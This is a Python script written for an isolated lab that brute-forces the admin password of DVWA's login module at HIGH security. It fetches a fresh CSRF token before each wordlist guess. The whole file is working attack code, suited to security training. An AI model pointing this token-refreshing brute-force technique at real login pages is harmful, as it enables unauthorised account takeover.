#!/usr/bin/env python3
"""
DVWA Brute Force (High) - Emmas Version

This script demonstrates a dictionary-based brute-force attack against
the DVWA brute-force module at the HIGH security level.

Workflow:
1. Request DVWA login page and extract login CSRF token
2. Log in to DVWA using known lab credentials
3. Set DVWA security level to HIGH
4. Repeatedly request the brute-force page
5. Extract a fresh CSRF token before each login attempt
6. Submit username/password candidates until valid credentials are found

Author: Emma Engstrom
Environment: Kali Linux -> DVWA in isolated lab
"""

from __future__ import annotations

import argparse
import re
import sys
from pathlib import Path
from typing import Optional

import requests


# =========================
# Terminal Colors
# =========================
class Color:
    RESET = "\033[0m"
    BOLD = "\033[1m"

    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    CYAN = "\033[36m"
    GRAY = "\033[90m"


def ctext(text: str, color: str) -> str:
    return f"{color}{text}{Color.RESET}"


# =========================
# Configuration
# =========================
BASE_URL = "http://192.168.56.3/DVWA"
LOGIN_URL = f"{BASE_URL}/login.php"
SECURITY_URL = f"{BASE_URL}/security.php"
BRUTE_URL = f"{BASE_URL}/vulnerabilities/brute/"

DVWA_USERNAME = "admin"
DVWA_PASSWORD = "password"
TARGET_USERNAME = "admin"

WORDLIST_FILE = "/usr/share/wordlists/metasploit/http_default_pass.txt"
FALLBACK_PASSWORDS = ["123456", "admin", "password", "letmein"]

SUCCESS_TEXT = "Welcome to the password protected area"

TIMEOUT = 10
USER_AGENT = "Mozilla/5.0 (DVWA High Brute Force Portfolio Script)"


# =========================
# CLI Arguments
# =========================
def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="DVWA High Brute Force (Emmas Version)"
    )

    parser.add_argument(
        "-w",
        "--wordlist",
        default=WORDLIST_FILE,
        help="Path to password wordlist",
    )

    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Show CSRF tokens and detailed request info",
    )

    return parser.parse_args()


# =========================
# Helper Functions
# =========================
def extract_token(html_text: str) -> Optional[str]:
    patterns = [
        r"name='user_token'\s+value='(.*?)'",
        r'name="user_token"\s+value="(.*?)"',
    ]

    for pattern in patterns:
        match = re.search(pattern, html_text)
        if match:
            return match.group(1)

    return None


def format_token(token: str, visible: int = 6) -> str:
    if len(token) <= visible * 2:
        return token
    return f"{token[:visible]}...{token[-visible:]}"


def load_passwords(wordlist_path: str) -> list[str]:
    path = Path(wordlist_path)

    if path.is_file():
        try:
            with path.open("r", encoding="latin-1", errors="ignore") as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(ctext(f"[+] Loaded {len(passwords)} passwords from: {wordlist_path}", Color.GREEN))
            return passwords
        except OSError as exc:
            print(ctext(f"[!] Failed to read wordlist: {exc}", Color.RED))

    print(ctext("[!] Wordlist file not found. Using fallback password list.", Color.RED))
    return FALLBACK_PASSWORDS.copy()


def get_page(session: requests.Session, url: str) -> requests.Response:
    response = session.get(url, timeout=TIMEOUT, allow_redirects=True)
    response.raise_for_status()
    return response


def post_form(session: requests.Session, url: str, data: dict) -> requests.Response:
    response = session.post(url, data=data, timeout=TIMEOUT, allow_redirects=True)
    response.raise_for_status()
    return response


# =========================
# DVWA Login
# =========================
def get_login_token(session: requests.Session) -> str:
    response = get_page(session, LOGIN_URL)
    token = extract_token(response.text)

    if not token:
        raise RuntimeError("Failed to extract CSRF token from DVWA login page.")

    return token


def login_to_dvwa(session: requests.Session, verbose: bool = False) -> None:
    token = get_login_token(session)

    if verbose:
        print(ctext(f"[+] Login page token extracted: {format_token(token)}", Color.BLUE))

    login_data = {
        "username": DVWA_USERNAME,
        "password": DVWA_PASSWORD,
        "user_token": token,
        "Login": "Login",
    }

    response = post_form(session, LOGIN_URL, login_data)

    if "Logout" not in response.text and "DVWA Security" not in response.text:
        raise RuntimeError("DVWA login failed. Check credentials or CSRF handling.")

    print(ctext(f"[+] Logged into DVWA as '{DVWA_USERNAME}'", Color.GREEN))


# =========================
# Set Security Level
# =========================
def get_security_token(session: requests.Session) -> str:
    response = get_page(session, SECURITY_URL)
    token = extract_token(response.text)

    if not token:
        raise RuntimeError("Failed to extract CSRF token from security.php.")

    return token


def set_security_level(
    session: requests.Session,
    level: str = "high",
    verbose: bool = False,
) -> None:
    token = get_security_token(session)

    if verbose:
        print(ctext(f"[+] Security page token extracted: {format_token(token)}", Color.BLUE))

    security_data = {
        "security": level,
        "seclev_submit": "Submit",
        "user_token": token,
    }

    response = post_form(session, SECURITY_URL, security_data)

    if "Security level changed" not in response.text and "DVWA Security" not in response.text:
        raise RuntimeError(f"Failed to set DVWA security level to '{level}'.")

    print(ctext(f"[+] DVWA security level set to '{level}'", Color.GREEN))


# =========================
# Brute Force Logic
# =========================
def get_brute_token(session: requests.Session) -> str:
    response = get_page(session, BRUTE_URL)
    token = extract_token(response.text)

    if not token:
        raise RuntimeError("Failed to extract CSRF token from brute-force page.")

    return token


def attempt_login(
    session: requests.Session,
    username: str,
    password: str,
    token: str,
) -> requests.Response:
    params = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": token,
    }

    response = session.get(BRUTE_URL, params=params, timeout=TIMEOUT, allow_redirects=True)
    response.raise_for_status()
    return response


def brute_force(
    session: requests.Session,
    username: str,
    passwords: list[str],
    verbose: bool = False,
) -> Optional[str]:
    for attempt_number, password in enumerate(passwords, start=1):
        token = get_brute_token(session)

        print()
        print(ctext(f"[-] Attempt {attempt_number}", Color.YELLOW))
        print(f"    {ctext('Username', Color.CYAN)} : {username}")
        print(f"    {ctext('Password', Color.CYAN)} : {password}")

        if verbose:
            print(f"    {ctext('CSRF', Color.CYAN)}     : {ctext(format_token(token), Color.BLUE)}")

        response = attempt_login(session, username, password, token)

        if verbose:
            print(f"    {ctext('Status', Color.CYAN)}   : {response.status_code}")
            print(f"    {ctext('Length', Color.CYAN)}   : {len(response.text)} bytes")

        if SUCCESS_TEXT in response.text:
            print()
            print(ctext("[+] SUCCESS DETECTED!", Color.GREEN + Color.BOLD))
            print(ctext(f"[+] Valid credentials: {username} / {password}", Color.GREEN))

            if verbose:
                match_position = response.text.find(SUCCESS_TEXT)
                print(f"{ctext('[+] Token used', Color.GREEN)}: {ctext(format_token(token), Color.BLUE)}")
                print(ctext("[+] Success indicator matched:", Color.GREEN))
                print(f'    "{SUCCESS_TEXT}"')
                print(ctext(f"[+] Match position in response: {match_position}", Color.GREEN))

            return password

        print(ctext("    Login failed", Color.RED))

    return None


# =========================
# Main
# =========================
def main() -> None:
    args = parse_args()
    passwords = load_passwords(args.wordlist)

    print(ctext("=" * 55, Color.GRAY))
    print(ctext("DVWA HIGH BRUTE FORCE DEMO", Color.BOLD + Color.CYAN))
    print(ctext("=" * 55, Color.GRAY))

    with requests.Session() as session:
        session.headers.update({"User-Agent": USER_AGENT})

        try:
            login_to_dvwa(session, verbose=args.verbose)
            set_security_level(session, "high", verbose=args.verbose)

            found_password = brute_force(
                session=session,
                username=TARGET_USERNAME,
                passwords=passwords,
                verbose=args.verbose,
            )

            if found_password:
                print(ctext(
                    f"[+] Valid credentials discovered: {TARGET_USERNAME} / {found_password}",
                    Color.GREEN + Color.BOLD,
                ))
            else:
                print(ctext("[!] No valid password found in the supplied wordlist.", Color.RED))

        except requests.RequestException as exc:
            print(ctext(f"[!] HTTP error: {exc}", Color.RED))
            sys.exit(1)
        except RuntimeError as exc:
            print(ctext(f"[!] Runtime error: {exc}", Color.RED))
            sys.exit(1)
        except KeyboardInterrupt:
            print(ctext("\n[!] Interrupted by user.", Color.RED))
            sys.exit(130)


if __name__ == "__main__":
    main()
